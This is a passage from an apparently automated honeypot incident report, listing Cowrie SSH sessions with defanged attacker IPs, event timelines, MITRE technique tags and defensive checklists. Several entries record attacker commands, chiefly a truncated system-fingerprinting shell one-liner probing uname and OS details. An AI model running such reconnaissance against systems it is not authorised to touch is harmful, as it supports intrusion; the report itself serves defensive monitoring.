| `2026-07-06 05:14:10` | `cowrie.log.closed` |
| `2026-07-06 05:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.61.23[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.61.23[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fce46950d7

| Field | Detail |
|---|---|
| **Source IP** | `130.61.23[.]223` |
| **First Seen** | 2026-07-06 05:14 |
| **Last Seen** | 2026-07-06 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:14:10` | `cowrie.session.connect` |
| `2026-07-06 05:14:10` | `cowrie.login.success` |
| `2026-07-06 05:14:10` | `cowrie.session.params` |
| `2026-07-06 05:14:10` | `cowrie.command.input` |
| `2026-07-06 05:14:10` | `cowrie.command.failed` |
| `2026-07-06 05:14:10` | `cowrie.command.input` |
| `2026-07-06 05:14:10` | `cowrie.log.closed` |
| `2026-07-06 05:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.61.23[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.61.23[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b43c405107d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:14 |
| **Last Seen** | 2026-07-06 05:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:14:17` | `cowrie.session.connect` |
| `2026-07-06 05:14:18` | `cowrie.client.version` |
| `2026-07-06 05:14:18` | `cowrie.client.kex` |
| `2026-07-06 05:14:21` | `cowrie.login.success` |
| `2026-07-06 05:14:23` | `cowrie.session.params` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.success` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:23` | `cowrie.command.input` |
| `2026-07-06 05:14:24` | `cowrie.log.closed` |
| `2026-07-06 05:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d141ddb779cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:15 |
| **Last Seen** | 2026-07-06 05:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:15:03` | `cowrie.session.connect` |
| `2026-07-06 05:15:03` | `cowrie.client.version` |
| `2026-07-06 05:15:03` | `cowrie.client.kex` |
| `2026-07-06 05:15:07` | `cowrie.login.success` |
| `2026-07-06 05:15:09` | `cowrie.session.params` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.success` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:09` | `cowrie.command.input` |
| `2026-07-06 05:15:10` | `cowrie.log.closed` |
| `2026-07-06 05:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbe5932aff5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:15 |
| **Last Seen** | 2026-07-06 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:15:12` | `cowrie.session.connect` |
| `2026-07-06 05:15:12` | `cowrie.client.version` |
| `2026-07-06 05:15:12` | `cowrie.client.kex` |
| `2026-07-06 05:15:13` | `cowrie.login.success` |
| `2026-07-06 05:15:13` | `cowrie.session.params` |
| `2026-07-06 05:15:13` | `cowrie.command.input` |
| `2026-07-06 05:15:14` | `cowrie.log.closed` |
| `2026-07-06 05:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8d18e648e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:15 |
| **Last Seen** | 2026-07-06 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:15:49` | `cowrie.session.connect` |
| `2026-07-06 05:15:50` | `cowrie.client.version` |
| `2026-07-06 05:15:50` | `cowrie.client.kex` |
| `2026-07-06 05:15:54` | `cowrie.login.success` |
| `2026-07-06 05:15:56` | `cowrie.session.params` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.success` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.command.input` |
| `2026-07-06 05:15:56` | `cowrie.log.closed` |
| `2026-07-06 05:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da045f759f39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:16 |
| **Last Seen** | 2026-07-06 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:16:35` | `cowrie.session.connect` |
| `2026-07-06 05:16:36` | `cowrie.client.version` |
| `2026-07-06 05:16:36` | `cowrie.client.kex` |
| `2026-07-06 05:16:39` | `cowrie.login.success` |
| `2026-07-06 05:16:41` | `cowrie.session.params` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.success` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:41` | `cowrie.command.input` |
| `2026-07-06 05:16:42` | `cowrie.log.closed` |
| `2026-07-06 05:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e21231d769a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:17 |
| **Last Seen** | 2026-07-06 05:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:17:22` | `cowrie.session.connect` |
| `2026-07-06 05:17:22` | `cowrie.client.version` |
| `2026-07-06 05:17:22` | `cowrie.client.kex` |
| `2026-07-06 05:17:26` | `cowrie.login.success` |
| `2026-07-06 05:17:28` | `cowrie.session.params` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.success` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.command.input` |
| `2026-07-06 05:17:28` | `cowrie.log.closed` |
| `2026-07-06 05:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b84cfe545c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:18 |
| **Last Seen** | 2026-07-06 05:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:18:08` | `cowrie.session.connect` |
| `2026-07-06 05:18:09` | `cowrie.client.version` |
| `2026-07-06 05:18:09` | `cowrie.client.kex` |
| `2026-07-06 05:18:12` | `cowrie.login.success` |
| `2026-07-06 05:18:15` | `cowrie.session.params` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.success` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.command.input` |
| `2026-07-06 05:18:15` | `cowrie.log.closed` |
| `2026-07-06 05:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a124003c37

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 05:18 |
| **Last Seen** | 2026-07-06 05:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:18:14` | `cowrie.session.connect` |
| `2026-07-06 05:18:15` | `cowrie.client.version` |
| `2026-07-06 05:18:15` | `cowrie.client.kex` |
| `2026-07-06 05:18:22` | `cowrie.login.success` |
| `2026-07-06 05:18:26` | `cowrie.session.params` |
| `2026-07-06 05:18:26` | `cowrie.command.input` |
| `2026-07-06 05:18:27` | `cowrie.log.closed` |
| `2026-07-06 05:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af927fa0778d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:18 |
| **Last Seen** | 2026-07-06 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:18:55` | `cowrie.session.connect` |
| `2026-07-06 05:18:56` | `cowrie.client.version` |
| `2026-07-06 05:18:56` | `cowrie.client.kex` |
| `2026-07-06 05:18:59` | `cowrie.login.success` |
| `2026-07-06 05:19:01` | `cowrie.session.params` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.success` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:01` | `cowrie.command.input` |
| `2026-07-06 05:19:02` | `cowrie.log.closed` |
| `2026-07-06 05:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa8c4808748

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:19 |
| **Last Seen** | 2026-07-06 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:19:42` | `cowrie.session.connect` |
| `2026-07-06 05:19:43` | `cowrie.client.version` |
| `2026-07-06 05:19:43` | `cowrie.client.kex` |
| `2026-07-06 05:19:45` | `cowrie.login.success` |
| `2026-07-06 05:19:47` | `cowrie.session.params` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.success` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:47` | `cowrie.command.input` |
| `2026-07-06 05:19:48` | `cowrie.log.closed` |
| `2026-07-06 05:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c556f6fac276

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:20 |
| **Last Seen** | 2026-07-06 05:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:20:29` | `cowrie.session.connect` |
| `2026-07-06 05:20:30` | `cowrie.client.version` |
| `2026-07-06 05:20:30` | `cowrie.client.kex` |
| `2026-07-06 05:20:33` | `cowrie.login.success` |
| `2026-07-06 05:20:35` | `cowrie.session.params` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.success` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:35` | `cowrie.command.input` |
| `2026-07-06 05:20:36` | `cowrie.log.closed` |
| `2026-07-06 05:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a146c9fc25ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:21 |
| **Last Seen** | 2026-07-06 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:21:15` | `cowrie.session.connect` |
| `2026-07-06 05:21:16` | `cowrie.client.version` |
| `2026-07-06 05:21:16` | `cowrie.client.kex` |
| `2026-07-06 05:21:20` | `cowrie.login.success` |
| `2026-07-06 05:21:22` | `cowrie.session.params` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.success` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.command.input` |
| `2026-07-06 05:21:22` | `cowrie.log.closed` |
| `2026-07-06 05:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af9c93f5bf5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:22 |
| **Last Seen** | 2026-07-06 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:22:03` | `cowrie.session.connect` |
